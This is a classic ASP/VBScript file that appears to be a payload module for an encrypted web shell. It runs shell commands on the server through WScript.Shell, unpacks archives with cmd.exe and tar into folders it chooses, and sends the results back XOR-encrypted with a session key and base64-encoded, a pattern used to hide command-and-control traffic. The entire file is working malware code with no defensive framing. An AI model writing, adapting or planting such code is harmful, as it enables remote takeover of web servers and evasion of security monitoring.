Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,((i - 1 + 5) And 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Base64Encode(sText)
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.nodeTypedValue = Stream_StringToBinary(sText)
  If Mid(oNode.text,1,4)="77u/" Then oNode.text=Mid(oNode.text,5)
  Base64Encode = Replace(oNode.text, vbLf, "")
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Function ShellQuote(value)
  ShellQuote = """" & Replace(value, """", """""") & """"
End Function

Function RunCommand(command)
  On Error Resume Next
  Set ws = Server.CreateObject("WScript.Shell")
  Set process = ws.Exec(command)
  output = process.StdOut.ReadAll & process.StdErr.ReadAll
  If Err.Number <> 0 Then
    output = Err.Description
    Err.Clear
  End If
  RunCommand = output
End Function

Sub main(srcPath, toPath)
  On Error Resume Next
  Set fso = Server.CreateObject("Scripting.FileSystemObject")
  If Not fso.FolderExists(toPath) Then fso.CreateFolder(toPath)
  cmd = "cmd.exe /c tar.exe -xf " & ShellQuote(srcPath) & " -C " & ShellQuote(toPath)
  result = RunCommand(cmd)
  If Len(result) = 0 Then
    Response.binarywrite(Encrypt(Base64Encode("Success")))
  Else
    If Len(result) = 0 Then result = Err.Description
    Response.binarywrite(Encrypt(Base64Encode(result)))
  End If
End Sub
